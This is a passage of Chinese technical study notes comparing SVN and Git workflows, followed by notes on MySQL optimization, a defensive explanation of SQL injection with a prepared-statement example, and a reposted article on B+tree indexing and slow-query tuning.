Subversion可以将整个库检出到工作区，也可以将某个目录检出到工作区。对于要使用一个庞大、臃肿的版本库的用户来说，部分检出是非常方便和实际的。

但是Git只能全部检出，不支持按照目录进行的部分检出。

1. SVN的部分检出

• 在SVN中，从仓库checkout的一个工作树，每个子目录下都维护着自己的.svn目录， 记录着该目录中文件的修改情况以及和服务器端仓库的对应关系。所以SVN可以checkout部分路径下的内容（部分检出）， 而不用checkout整个版本库或分支。

• Subversion 有一条命令：svn export ，可以将 subversion 版本库的一个目录下所有内容导出到指定的目录下。

Subversion 需要 svn export 命令是因为该命令可以导出一个干净的目录，即不包含 .svn 目录（包含配置文件和文件原始拷贝）。

2. Git的检出

• Git 没有部分检出，这并不是说只有将整个库克隆下来才能查看文件。有很多 git 工具，提供直接浏览git库的功能， 例如 gitweb, trac 的 git 版本库浏览, redmine 的 git 版本库浏览。

• Git-submodule 可以实现版本库的模块化：Git 通过子模块处理这个问题。 子模块允许你将一个Git 仓库当作另外一个Git仓库的子目录。这允许你克隆另外一个仓库到你的项目中并且保持你的提交相对独立。

• Git 为什么没有实现 svn export 的功能？由于git的本地仓库信息完全维护在project根目录的.git目录下， （不像svn一样，每个子目录下都有单独的.svn目录）。所以，只要clone，checkout然后删除.git目录就可以了。

五、 更新和提交

1．更新操作

在SVN中，因为只有一个中心仓库，所以所谓的远程更新，也就是svn update ,通过此命令来使工作区和版本库保持同步。

对于git来说，别人的改动是存在于远程仓库上的，所以git checkout命令尽管在某些功能上和svn中的update类似 （例如取仓库特定版本的内容），但是在远程更新这一点上，还是不同的，不属于git checkout的功能涵盖范围。 

Git使用git fetch和git pull来完成远程更新任务，fetch操作只是将远程数据库的object拷贝到本地， 然后更新remotes head的refs，git pull 的操作则是在git fetch的基础上对当前分支外加merge操作。

2．SVN中的commit命令

对于SVN来说，由于是中心式的仓库管理形式，所以并不存在特殊的远程提交的概念， 所有的commit操作都可以认为是对远程仓库的更新动作。在工作区中对文件 进行添加、修改、删除操作要同步到版本库，必须使用 commit命令。

• add 命令，是将未标记为版本控制状态的文件标记为添加状态，并在下次提交时入库。

• delete命令，是通过SVN来删除文件，并在下次提交后有效。

• Subversion 有提交列表功能，即将某些文件加入一个修改列表，提交可以只提交处于该列表的文件。

3．Git中的暂存区域（stage）

Git 管理项目时，文件在三个工作区域中流转：Git 的本地数据目录，工作目录以及暂存区域。

暂存区域（stage）是介于 workcopy 和 版本库  HEAD 版本的一种中间状态。所谓的暂存区域只不过是个简单的文件， 一般都放在git 目录中。有时候人们会把这个文件叫做索引文件，不过标准说法还是叫暂存区域。

要将一个文件纳入版本管理的范畴，首先是要用git  add将文件纳入stage的监控范围， 只有更新到stage中的内容才会在commit的时候被提交。另外，文件本身的改动并不会自动更新到stage中， 每次的任何修改都必须重新更新到stage中去才会被提交。对于工作区直接删除的文件， 需要用 git rm 命令进行标记，在下次提交时，在版本库中删除。

• 工作区的文件改动（新增文件，修改文件，删除文件），必须用 git add 或者 git rm 命令标识，使得改动进入 stage

• 提交只对加入 stage 的改动进行提交

• 如果一个文件改动加入 stage 后再次改动，则后续改动不改变 stage。即该文件的改动有两个状态， 一个是标记到 stage 中并将在下次提交时入库的改动，另外的后续改动则不被提交，除非再次使用 git add 命令将改动加入到 stage 中。

• Git的stag让你在提交的时候清楚的知道git将要提交哪些改动。除非提交的时候使用 -a 参数（不建议使用）。

我们可以从文件所处的位置来判断其状态：如果是git目录中保存着的特定版本文件，就属于已提交状态；

如果作了修改并已放入暂存区域，就属于已暂存状态；如果自上次取出后，作了修改但还没有放到暂存区域， 就是已修改状态，如果取出后未进行修改则是未修改状态。

在git中，因为有本地仓库和remote仓库之分，所以也就区别于commit 操作，存在额外的push命令， 用于将本地仓库的数据更新到远程仓库中去。git push 可以选择需要提交的、更新的分支以及制定该分支在远程仓库上的名字。

六、 分支和里程碑的实现

几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来， 然后在不影响主线的同时继续工作。在很多版本控制系统中，这是个昂贵的过程， 常常需要创建一个源代码目录的完整副本，对大型项目来说会花费很长时间。

轻量级分支/里程碑的含义是，创建分支/里程碑的复杂度是o(1)，不会因为版本库的愈加庞大而变得缓慢。在CVS中， 创建分支的复杂度是o(n)的，导致大的版本库的的分支创建非常缓慢。

1．Subversion的分支/里程碑

Subversion轻量级分支和里程碑的实现是通过svn cp命令，即带历史的拷贝就是创建快速创建分支和里程碑的秘籍。

Subversion的版本库有特殊的设计，当你复制一个目录，你不需要担心版本库会变得十分巨大—Subversion并不是拷贝所有的数据， 相反，它只是建立了一个已存在目录树的入口。这种“廉价的拷贝”就是创建分支/里程碑是轻量级的原因。

由于Svn的分支和标签是来自目录拷贝，约定俗成是拷贝在 branches/和tags/目录下。所谓分支， tag等概念都只是仓库中不同路径上的一个对象或索引而已，和普通的路径并没有什么本质的区别， 谁也不能阻止在一个提交中同时修改不同分支中的数据。

里程碑是对某个历史提交所起的一个别名，作为历史的标记，是不应该被更改的。svn的里程碑要建立到 tags/目录下， 要求不要在tags/下的里程碑目录下进行提交。但是谁也阻止不了对未进行权限控制的里程碑的篡改。

2．Git 的轻量级分支和里程碑

Git中的分支实际上仅是一个包含所指对象校验和（40个字符长度SHA-1 哈希值）的文件，所以创建和销毁一个分支就变得非常廉价。

说白了，新建一个分支就是向一个文件写入41个字节（版本号外加一个换行符）那么简单，自然速度就很快了。 

Git的实现与项目复杂度无关，它永远可以在几毫秒的时间内完成分支的创建和切换。这和大多数版本控制系统形成了鲜明对比。

Git的分支是完全隔离的，而Subversion则没有。分支本来就应该是相对独立的命名空间，一个提交一般只能发生在一个分支中。

在Git中，其内部的对象层级依赖关系或许和SVN类似，但是其工作树的视图表现形式和SVN完全不同。工作树永远是一个完整的分支， 不同的分支由不同的head索引去构建，你不可能在工作树中同时获得多个分支的内容。

Git使用的标签有两种类型：轻量级的（lightweight）和含附注的（annotated）。① 轻量级标签就像是个不会变化的分支， 实际上它就是个指向特定提交对象的引用。② 而含附注标签，实际上是存储在仓库中的一个独立对象，它有自身的校验和信息， 包含着标签的名字，电子邮件地址和日期，以及标签说明，标签本身也允许使用GNU Privacy Guard (GPG) 来签署或验证。

Git的里程碑是只读的，Git完全遵守历史不可更改这一时空法则。用户不能向git的里程碑中提交，否则里程碑就不是标记， 而成了一个分支。当然Git允许用户删除里程碑再重新创建指定到不同历史提交。

3．多分支间的切换

SVN中提供了一个功能switch，使用switch可以在同一个工作树上，在不同的分支中进行切换。

Git在分支中进行切换使用的命令是checkout。

七、 分支与合并

Git 和 Svn 的分支实现机制完全的不同，这也直接导致了 SVN 在分支合并中困难重重。尽管在 SVN 1.5 之后， 通过 svn:mergeinfo 属性引入了合并追踪机制，但是在特定情况下，合并仍会出现很多困难。

1． SVN的分支合并

当你在一个分支上工作数周或几个月之后，主干的修改也同时在进行着，两条线的开发会区别巨大，当你想合并分支回主干， 可能因为太多冲突，已经无法轻易合并你的分支和主干的修改。

另一个问题，Subversion不会记录任何合并操作，当你提交本地修改，版本库并不能判断出你是通过svn merge还是手工修改得到这些文件。

所以你必须手工记录这些信息（说明合并的特定版本号或是版本号的范围）。

要解决以上的问题只有通过有规律的将主干合并到分支来避免，制定这样一个政策：每周将上周的修改合并到分支，注意这样做时需要小心， 你必须手工记录合并的过程，以避免重复的合并，你需要小心的撰写合并的日志信息，精确的描述合并包括的范围。这样做看起来有点像是胁迫。

SVN 的版本号是连续的版本号。每一次新的提交都会版本号+1 ，而无论这个提交是在哪个分支中进行的。

SVN一个提交可以同时修改不同分支的不同文件，因为提交命令可以在 /trunk, /branches, /tags 的上一级目录执行。

• SVN 的提交是单线索的，每一个提交（最原始的提交0除外）都只有一个父节点（版本号小一个的提交节点）

• SVN 的提交链只有一条，仅从版本号和提交说明，我们无法获得分支图

• SVN 的分支图在某些工具（如乌龟SVN）可以提供，那是需要对提交内容进行检查，对目录拷贝动作视为分支，

对 svn:mergeinfo 的改动视为合并，但这会由于目录管理的灵活性，导致千奇百怪的分支图表。

2．Git的分支合并

在 git 版本库中创建分支的成本几乎为零，所以，不必吝啬多创建几个分支。当第一次执行git-init时， 系统就会创建一个名为”master”的分支。 而其它分支则通过手工创建。下面列举一些常见的分支策略。 

① 创建一个属于自己的个人工作分支，以避免对主分支 master 造成太多的干扰，也方便与他人交流协作。 

② 当进行高风险的工作时，创建一个试验性的分支，扔掉一个烂摊子总比收拾一个烂摊子好得多。 

③ 合并别人修改的时候，最好创建一个临时的分支用来合并，合并完成后再“fatch”到自己的分支。

Git分支相关的操作命令

八、 撤消操作

1．提交的撤销

在Subversion中一旦完成向服务器的数据提交，你就没有办法再从客户端追回，只能在后续的提交中修正（回退或者修改）等。

因为Subversion作为集中式的版本控制，不能允许个人对已提交的数据进行篡改。

Subversion具有一个非常重要的特性就是它的信息从不丢失，即使当你删除了文件或目录， 它也许从最新版本中消失了 ，但这个对象依然存在于历史的早期版本中。

Git则不同，Git是分布式版本控制系统，代码库是属于个人，允许任意修改。

Git通过对提交建立数字摘要来保证提交的唯一性和不可更改性，通过版本库在多人之间的多份拷贝来保障数据的安全性。

Git可以丢弃最新的一个或几个提交，使用 git reset –hard命令可以永远丢弃最新的一个或者几个提交。

2．提交说明的修改

提交后如果对提交说明不满意，如何实现对提交说明的修改：

⑴ Git可以使用命令git commit –amend修改提交说明。

• Git可以修改最后一次提交说明，并不是说不能修改历史版本的提交说明，只是修改最后一个版本提交说明拥有最简单的命令；

• Git修改提交说明，会改变提交的commit-id。即修改提交说明后，将产生一个新的提交；

• Git可以通过git reset –hard ，git commit –amend，git rebase onto 等命令来实现对历史提交的修改；

• 使用stg工具可以更为简单的修改历史提交的提交说明，包括提交内容；

⑵ Subversion也可以修改提交说明，是通过修改提交的svn:log版本属性实现的：

• 不但可以修改最后一次提交的说明，并且可以修改历史提交的提交说明；

• Subversion修改提交说明是不可逆的操作，可能会造成说明被恶意修改；

• Subversion缺省关闭修改提交说明的功能。管理员在设置了提交说明更改的邮件通知后，才可以打开该功能。

3．修改和重构历史提交

Git可以修改和重构历史提交：使用Git本身的reset以及 rebase 命令可以修改或者重整/重构历史提交，非常灵活。

使用强大的 stg 可以使得历史提交的重构更为简洁，如果您对 stg 或者 Hg/MQ 熟悉的话。

Subversion 修改历史提交，只能由管理员完成。

Subversion 是集中式版本控制系统，从客户端一旦完成提交，就没有办法从客户端撤销提交。

但是管理员可以在服务器端完成提交的撤销和修改，但是操作过程和代价较大。

九、 权限管理

Subversion通过对文件目录授权来实现权限管理，子目录默认继承父目录的权限。但是也有缺憾，即权限不能在分支中继承， 不能对单个文件授权。例如为 /trunk及其子目录的授权，不能继承到分支或者标签中相应的目录下。

Git 的授权做不到Subversion那样精细。Git的授权模型只能实现非零即壹式的授权，要么拥有全部的写权限， 要么没有写权限，要么拥有整个版本库的读权限，要么禁用。

从技术上将，Git可能永远也做不到类似SVN的路径授权（读授权）：

• 如果允许按照路径授权，则各个克隆的关系将不再是平等的关系，有的内容多，有的内容少，分布式的理念被破坏

• 如果只有部分路径可读，则克隆出来的提交和原始提交的提交ID可能不同。因为提交ID是和提交内容有关的，克隆中提交的部分内容被丢弃，势必提交的ID也要重新计算

• 允许全部代码可读，只允许部分代码可写，在版本控制的管理下，是没有多大实际意义的，而且导致了提交的逻辑上的不完整。

那么有什么办法来解决授权的问题？

1. 公司内部代码开放。即代码在公司内部，对项目组成员一视同仁的开放。

2. 公司对代码库进行合理分解，对每个代码库分别授权。即某个代码库对团队成员完全开放，对其它团队完全封闭。

3. 公司使用Subversion做集中式的版本控制，个人和/或团队使用 Git-svn。这样在无法改变公司版本控制策略时，程序员可以采用的变通之法。

4. Git服务器的部署实际上可以使用钩子对分支和路径进行写授权，即可以控制谁能够创建分支，能够写特定文件。
 
十、优缺点比较

1．SVN优缺点

优点： 

1、 管理方便，逻辑明确，符合一般人思维习惯。 

2、 易于管理，集中式服务器更能保证安全性。 

3、 代码一致性非常高。 

4、 适合开发人数不多的项目开发。 

缺点： 

1、 服务器压力太大，数据库容量暴增。 

2、 如果不能连接到服务器上，基本上不可以工作，看上面第二步，如果服务器不能连接上，就不能提交，还原，对比等等。 

3、 不适合开源开发（开发人数非常非常多，但是Google app engine就是用svn的）。

但是一般集中式管理的有非常明确的权限管理机制（例如分支访问限制），可以实现分层管理，从而很好的解决开发人数众多的问题。

2．Git优缺点

优点： 

1、适合分布式开发，强调个体。 

2、公共服务器压力和数据量都不会太大。 

3、速度快、灵活。 

4、任意两个开发者之间可以很容易的解决冲突。 

5、离线工作。 

缺点： 

1、学习周期相对而言比较长。 

2、不符合常规思维。 

3、代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。


## 数据库篇
### mysql优化怎么做的？
1. 设计角度：存储引擎的选择，字段类型选择，范式

2. 功能角度：可以利用mysql自身的特性，如索引，查询缓存，碎片整理，分区、分表等

3. sql语句的优化方面:尽量简化查询语句，能查询字段少就尽量少查询字段，优化分页语句、分组语句等。

4. 部署大负载架构体系：数据库服务器单独出来，负载大时可以采用主从复制，读写分离机制进行设计

5. 从硬件上升级数据库服务器。


### sql注入是什么及如何预防sql注入？
SQL注入攻击指的是用户或者黑客通过构建特殊的输入作为参数传入我们的Web应用程序端，

而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，

其主要原因是程序员没有细致地过滤用户输入的数据，致使非法数据侵入系统而造成的。

因此我们在做开发过程中一定要预防sql注入，主要从两方面着手：

1、占位符的方式，就是对sql语句进行预处理，然后执行sql语句

2、通过addslashes或者mysql_real_escape_string这两个函数对用户输入的值进行转义处理，把一些特殊的字符转义掉。

### 预处理
预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。

预处理语句的工作原理如下

1. 预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 "?" 标记 。例如： `INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)` 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。

2. 执行：最后，将应用绑定的值传递给参数（"?" 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。 相比于直接执行SQL语句，预处理语句有两个主要优点：

1. 预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。

2. 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。

预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。
```
$stmt = $conn->prepare("INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $firstname, $lastname, $email);
// 设置参数并执行
$firstname = "John";
$lastname = "Doe";
$email = "john@example.com";
$stmt->execute();
$stmt->close();
```

### mysql索引
https://tech.meituan.com/2014/06/30/mysql-index.html

MySQL凭借着出色的性能、低廉的成本、丰富的资源，已经成为绝大多数互联网公司的首选关系型数据库。

虽然性能出色，但所谓“好马配好鞍”，如何能够更好的使用它，已经成为开发工程师的必修课， 我们经常会从职位描述上看到诸如“精通MySQL”、“SQL语句优化”、“了解数据库原理”等要求。

我们知道一般的应用系统，读写比例在10:1左右，而且插入操作和一般的更新操作很少出现性能问题，遇到最多的， 也是最容易出问题的，还是一些复杂的查询操作，所以查询语句的优化显然是重中之重。

本人从2013年7月份起，一直在美团核心业务系统部做慢查询的优化工作，共计十余个系统，累计解决和积累了上百个慢查询案例。

随着业务的复杂性提升，遇到的问题千奇百怪，五花八门，匪夷所思。本文旨在以开发工程师的角度来解释数据库索引的原理和如何优化慢查询。
```
一个慢查询引发的思考
select
   count(*) 
from
   task 
where
   status=2 
   and operator_id=20839 
   and operate_time>1371169729 
   and operate_time<1371174603 
   and type=2;
```
系统使用者反应有一个功能越来越慢，于是工程师找到了上面的SQL。

并且兴致冲冲的找到了我，“这个SQL需要优化，给我把每个字段都加上索引”。

我很惊讶，问道：“为什么需要每个字段都加上索引？”

“把查询的字段都加上索引会更快”，工程师信心满满。

“这种情况完全可以建一个联合索引，因为是最左前缀匹配，所以operate_time需要放到最后， 而且还需要把其他相关的查询都拿来，需要做一个综合评估。”

“联合索引？最左前缀匹配？综合评估？”工程师不禁陷入了沉思。

多数情况下，我们知道索引能够提高查询效率，但应该如何建立索引？索引的顺序如何？许多人却只知道大概。

其实理解这些概念并不难，而且索引的原理远没有想象的那么复杂。

MySQL索引原理

索引目的

索引的目的在于提高查询效率，可以类比字典，如果要查“mysql”这个单词，我们肯定需要定位到m字母，然后从下往下找到y字母，

再找到剩下的sql。如果没有索引，那么你可能需要把所有单词看一遍才能找到你想要的，如果我想找到m开头的单词呢？

或者ze开头的单词呢？是不是觉得如果没有索引，这个事情根本无法完成？

索引原理

除了词典，生活中随处可见索引的例子，如火车站的车次表、图书的目录等。它们的原理都是一样的， 通过不断的缩小想要获得数据的范围来筛选出最终想要的结果，同时把随机的事件变成顺序的事件， 也就是我们总是通过同一种查找方式来锁定数据。

数据库也是一样，但显然要复杂许多，因为不仅面临着等值查询，还有范围查询(>、<、between、in)、模糊查询(like)、并集查询(or)等等。

数据库应该选择怎么样的方式来应对所有的问题呢？我们回想字典的例子，能不能把数据分成段，然后分段查询呢？

最简单的如果1000条数据，1到100分成第一段，101到200分成第二段，201到300分成第三段……这样查第250条数据， 只要找第三段就可以了，一下子去除了90%的无效数据。但如果是1千万的记录呢，分成几段比较好？稍有算法基础的同学会想到搜索树， 其平均复杂度是lgN，具有不错的查询性能。但这里我们忽略了一个关键的问题，复杂度模型是基于每次相同的操作成本来考虑的， 数据库实现比较复杂，数据保存在磁盘上，而为了提高性能，每次又可以把部分数据读入内存来计算， 因为我们知道访问磁盘的成本大概是访问内存的十万倍左右，所以简单的搜索树难以满足复杂的应用场景。

磁盘IO与预读

前面提到了访问磁盘，那么这里先简单介绍一下磁盘IO和预读，磁盘读取数据靠的是机械运动， 每次读取数据花费的时间可以分为寻道时间、旋转延迟、传输时间三个部分，寻道时间指的是磁臂移动到指定磁道所需要的时间， 主流磁盘一般在5ms以下；旋转延迟就是我们经常听说的磁盘转速，比如一个磁盘7200转，表示每分钟能转7200次，也就是说1秒钟能转120次， 旋转延迟就是1/120/2 = 4.17ms；传输时间指的是从磁盘读出或将数据写入磁盘的时间，一般在零点几毫秒，相对于前两个时间可以忽略不计。

那么访问一次磁盘的时间，即一次磁盘IO的时间约等于5+4.17 = 9ms左右，听起来还挺不错的， 但要知道一台500 -MIPS的机器每秒可以执行5亿条指令，因为指令依靠的是电的性质，换句话说执行一次IO的时间可以执行40万条指令， 数据库动辄十万百万乃至千万级数据，每次9毫秒的时间，显然是个灾难。下图是计算机硬件延迟的对比图，供大家参考：
```
various-system-software-hardware-latencies
various-system-software-hardware-latencies
```
考虑到磁盘IO是非常高昂的操作，计算机操作系统做了一些优化，当一次IO时，不光把当前磁盘地址的数据， 而是把相邻的数据也都读取到内存缓冲区内，因为局部预读性原理告诉我们，当计算机访问一个地址的数据的时候， 与其相邻的数据也会很快被访问到。每一次IO读取的数据我们称之为一页(page)。具体一页有多大数据跟操作系统有关， 一般为4k或8k，也就是我们读取一页内的数据时候，实际上才发生了一次IO，这个理论对于索引的数据结构设计非常有帮助。

索引的数据结构

前面讲了生活中索引的例子，索引的基本原理，数据库的复杂性，又讲了操作系统的相关知识，目的就是让大家了解， 任何一种数据结构都不是凭空产生的，一定会有它的背景和使用场景，我们现在总结一下，我们需要这种数据结构能够做些什么， 其实很简单，那就是：每次查找数据时把磁盘IO次数控制在一个很小的数量级，最好是常数数量级。 那么我们就想到如果一个高度可控的多路搜索树是否能满足需求呢？就这样，b+树应运而生。

详解b+树

b+树

如上图，是一颗b+树，关于b+树的定义可以参见B+树，这里只说一些重点，浅蓝色的块我们称之为一个磁盘块， 可以看到每个磁盘块包含几个数据项（深蓝色所示）和指针（黄色所示），如磁盘块1包含数据项17和35， 包含指针P1、P2、P3，P1表示小于17的磁盘块，P2表示在17和35之间的磁盘块，P3表示大于35的磁盘块。

真实的数据存在于叶子节点即3、5、9、10、13、15、28、29、36、60、75、79、90、99。非叶子节点只不存储真实的数据， 只存储指引搜索方向的数据项，如17、35并不真实存在于数据表中。

b+树的查找过程

如图所示，如果要查找数据项29，那么首先会把磁盘块1由磁盘加载到内存，此时发生一次IO，在内存中用二分查找确定29在17和35之间， 锁定磁盘块1的P2指针，内存时间因为非常短（相比磁盘的IO）可以忽略不计，通过磁盘块1的P2指针的磁盘地址把磁盘块3由磁盘加载到内存， 发生第二次IO，29在26和30之间，锁定磁盘块3的P2指针，通过指针加载磁盘块8到内存，发生第三次IO，同时内存中做二分查找找到29， 结束查询，总计三次IO。真实的情况是，3层的b+树可以表示上百万的数据，如果上百万的数据查找只需要三次IO， 性能提高将是巨大的，如果没有索引，每个数据项都要发生一次IO，那么总共需要百万次的IO，显然成本非常非常高。

b+树性质

1.通过上面的分析，我们知道IO次数取决于b+数的高度h，假设当前数据表的数据为N，每个磁盘块的数据项的数量是m， 则有h=㏒(m+1)N，当数据量N一定的情况下，m越大，h越小；而m = 磁盘块的大小 / 数据项的大小， 磁盘块的大小也就是一个数据页的大小，是固定的，如果数据项占的空间越小，数据项的数量越多，树的高度越低。

这就是为什么每个数据项，即索引字段要尽量的小，比如int占4字节，要比bigint8字节少一半。

这也是为什么b+树要求把真实的数据放到叶子节点而不是内层节点，一旦放到内层节点， 磁盘块的数据项会大幅度下降，导致树增高。当数据项等于1时将会退化成线性表。

2.当b+树的数据项是复合的数据结构，比如(name,age,sex)的时候，b+数是按照从左到右的顺序来建立搜索树的， 比如当(张三,20,F)这样的数据来检索的时候，b+树会优先比较name来确定下一步的所搜方向， 如果name相同再依次比较age和sex，最后得到检索的数据；但当(20,F)这样的没有name的数据来的时候， b+树就不知道下一步该查哪个节点，因为建立搜索树的时候name就是第一个比较因子， 必须要先根据name来搜索才能知道下一步去哪里查询。比如当(张三,F)这样的数据来检索时， b+树可以用name来指定搜索方向，但下一个字段age的缺失，所以只能把名字等于张三的数据都找到， 然后再匹配性别是F的数据了， 这个是非常重要的性质，即索引的最左匹配特性。


慢查询优化

关于MySQL索引原理是比较枯燥的东西，大家只需要有一个感性的认识，并不需要理解得非常透彻和深入。

我们回头来看看一开始我们说的慢查询，了解完索引原理之后，大家是不是有什么想法呢？先总结一下索引的几大基本原则：

建索引的几大原则

1.最左前缀匹配原则，非常重要的原则，mysql会一直向右匹配直到遇到范围查询(>、<、between、like)就停止匹配， 比如a = 1 and b = 2 and c > 3 and d = 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的， 如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。

2.=和in可以乱序，比如a = 1 and b = 2 and c = 3 建立(a,b,c)索引可以任意顺序， mysql的查询优化器会帮你优化成索引可以识别的形式。

3.尽量选择区分度高的列作为索引，区分度的公式是count(distinct col)/count(*)，表示字段不重复的比例， 比例越大我们扫描的记录数越少，唯一键的区分度是1，而一些状态、性别字段可能在大数据面前区分度就是0， 那可能有人会问，这个比例有什么经验值吗？使用场景不同，这个值也很难确定， 一般需要join的字段我们都要求是0.1以上，即平均1条扫描10条记录。

4.索引列不能参与计算，保持列“干净”，比如from_unixtime(create_time) = ’2014-05-29’就不能使用到索引， 原因很简单，b+树中存的都是数据表中的字段值，但进行检索时，需要把所有元素都应用函数才能比较， 显然成本太大。所以语句应该写成create_time = unix_timestamp(’2014-05-29’)。

5.尽量的扩展索引，不要新建索引。比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。

回到开始的慢查询

根据最左匹配原则，最开始的sql语句的索引应该是status、operator_id、type、operate_time的联合索引；

其中status、operator_id、type的顺序可以颠倒，所以我才会说，把这个表的所有相关查询都找到， 会综合分析；比如还有如下查询：
```
select * from task where status = 0 and type = 12 limit 10;
select count(*) from task where status = 0 ;
```
那么索引建立成(status,type,operator_id,operate_time)就是非常正确的，因为可以覆盖到所有情况。

这个就是利用了索引的最左匹配的原则

查询优化神器 - explain命令

关于explain命令相信大家并不陌生，具体用法和字段含义可以参考官网explain-output，这里需要强调rows是核心指标， 绝大部分rows小的语句执行一定很快（有例外，下面会讲到）。所以优化语句基本上都是在优化rows。

慢查询优化基本步骤

0.先运行看看是否真的很慢，注意设置SQL_NO_CACHE

1.where条件单表查，锁定最小返回记录表。这句话的意思是把查询语句的where都应用到表中返回的记录数最小的表开始查起， 单表每个字段分别查询，看哪个字段的区分度最高

2.explain查看执行计划，是否与1预期一致（从锁定记录较少的表开始查询）

3.order by limit 形式的sql语句让排序的表优先查

4.了解业务方使用场景

5.加索引时参照建索引的几大原则

6.观察结果，不符合预期继续从0分析

几个慢查询案例

下面几个例子详细解释了如何分析和优化慢查询。

复杂语句写法

很多情况下，我们写SQL只是为了实现功能，这只是第一步，不同的语句书写方式对于效率往往有本质的差别， 这要求我们对mysql的执行计划和索引原则有非常清楚的认识，请看下面的语句：
```
select
   distinct cert.emp_id 
from
   cm_log cl 
inner join
   (
      select
         emp.id as emp_id,
         emp_cert.id as cert_id 
      from
         employee emp 
      left join
         emp_certificate emp_cert 
            on emp.id = emp_cert.emp_id 
      where
         emp.is_deleted=0
   ) cert 
      on (
         cl.ref_table='Employee' 
         and cl.ref_oid= cert.emp_id
      ) 
      or (
         cl.ref_table='EmpCertificate' 
         and cl.ref_oid= cert.cert_id
      ) 
where
   cl.last_upd_date >='2013-11-07 15:03:00' 
   and cl.last_upd_date<='2013-11-08 16:00:00';
```
0.先运行一下，53条记录 1.87秒，又没有用聚合语句，比较慢

```
53 rows in set (1.87 sec)
1.explain

+----+-------------+------------+-------+---------------------------------+-----------------------+---------+-------------------+-------+--------------------------------+
| id | select_type | table      | type  | possible_keys                   | key                   | key_len | ref               | rows  | Extra                          |
+----+-------------+------------+-------+---------------------------------+-----------------------+---------+-------------------+-------+--------------------------------+
|  1 | PRIMARY     | cl         | range | cm_log_cls_id,idx_last_upd_date | idx_last_upd_date     | 8       | NULL              |   379 | Using where; Using temporary   |
|  1 | PRIMARY     | <derived2> | ALL   | NULL                            | NULL                  | NULL    | NULL              | 63727 | Using where; Using join buffer |
|  2 | DERIVED     | emp        | ALL   | NULL                            | NULL                  | NULL    | NULL              | 13317 | Using where                    |
|  2 | DERIVED     | emp_cert   | ref   | emp_certificate_empid           | emp_certificate_empid | 4       | meituanorg.emp.id |     1 | Using index                    |
+----+-------------+------------+-------+---------------------------------+-----------------------+---------+-------------------+-------+--------------------------------+
```
简述一下执行计划，首先mysql根据idx_last_upd_date索引扫描cm_log表获得379条记录；然后查表扫描了63727条记录，分为两部分， derived表示构造表，也就是不存在的表，可以简单理解成是一个语句形成的结果集，后面的数字表示语句的ID。

derived2表示的是ID = 2的查询构造了虚拟表，并且返回了63727条记录。我们再来看看ID = 2的语句究竟做了写什么返回了这么大量的数据， 首先全表扫描employee表13317条记录，然后根据索引emp_certificate_empid关联emp_certificate表，rows = 1表示， 每个关联都只锁定了一条记录，效率比较高。获得后，再和cm_log的379条记录根据规则关联。从执行过程上可以看出返回了太多的数据， 返回的数据绝大部分cm_log都用不到，因为cm_log只锁定了379条记录。

如何优化呢？可以看到我们在运行完后还是要和cm_log做join,那么我们能不能之前和cm_log做join呢？仔细分析语句不难发现， 其基本思想是如果cm_log的ref_table是EmpCertificate就关联emp_certificate表，如果ref_table是Employee就关联employee表， 我们完全可以拆成两部分，并用union连接起来，注意这里用union，而不用union all是因为原语句有“distinct”来得到唯一的记录， 而union恰好具备了这种功能。如果原语句中没有distinct不需要去重，我们就可以直接使用union all了，因为使用union需要去重的动作，会影响SQL性能。

优化过的语句如下：
```
select
   emp.id 
from
   cm_log cl 
inner join
   employee emp 
      on cl.ref_table = 'Employee' 
      and cl.ref_oid = emp.id  
where
   cl.last_upd_date >='2013-11-07 15:03:00' 
   and cl.last_upd_date<='2013-11-08 16:00:00' 
   and emp.is_deleted = 0  
union
select
   emp.id 
from
   cm_log cl 
inner join
   emp_certificate ec 
      on cl.ref_table = 'EmpCertificate' 
      and cl.ref_oid = ec.id  
inner join
   employee emp 
      on emp.id = ec.emp_id  
where
   cl.last_upd_date >='2013-11-07 15:03:00' 
   and cl.last_upd_date<='2013-11-08 16:00:00' 
   and emp.is_deleted = 0
```
4.不需要了解业务场景，只需要改造的语句和改造之前的语句保持结果一致

5.现有索引可以满足，不需要建索引

6.用改造后的语句实验一下，只需要10ms 降低了近200倍！

```
+----+--------------+------------+--------+---------------------------------+-------------------+---------+-----------------------+------+-------------+
| id | select_type  | table      | type   | possible_keys                   | key               | key_len | ref                   | rows | Extra       |
+----+--------------+------------+--------+---------------------------------+-------------------+---------+-----------------------+------+-------------+
|  1 | PRIMARY      | cl         | range  | cm_log_cls_id,idx_last_upd_date | idx_last_upd_date | 8       | NULL                  |  379 | Using where |
|  1 | PRIMARY      | emp        | eq_ref | PRIMARY                         | PRIMARY           | 4       | meituanorg.cl.ref_oid |    1 | Using where |
|  2 | UNION        | cl         | range  | cm_log_cls_id,idx_last_upd_date | idx_last_upd_date | 8       | NULL                  |  379 | Using where |
|  2 | UNION        | ec         | eq_ref | PRIMARY,emp_certificate_empid   | PRIMARY           | 4       | meituanorg.cl.ref_oid |    1 |             |
|  2 | UNION        | emp        | eq_ref | PRIMARY                         | PRIMARY           | 4       | meituanorg.ec.emp_id  |    1 | Using where |
| NULL | UNION RESULT | <union1,2> | ALL    | NULL                            | NULL              | NULL    | NULL                  | NULL |             |
+----+--------------+------------+--------+---------------------------------+-------------------+---------+-----------------------+------+-------------+
53 rows in set (0.01 sec)
```
明确应用场景

举这个例子的目的在于颠覆我们对列的区分度的认知，一般上我们认为区分度越高的列，越容易锁定更少的记录， 但在一些特殊的情况下，这种理论是有局限性的。

```
select
   * 
from
   stage_poi sp 
where
   sp.accurate_result=1 
   and (
      sp.sync_status=0 
      or sp.sync_status=2 
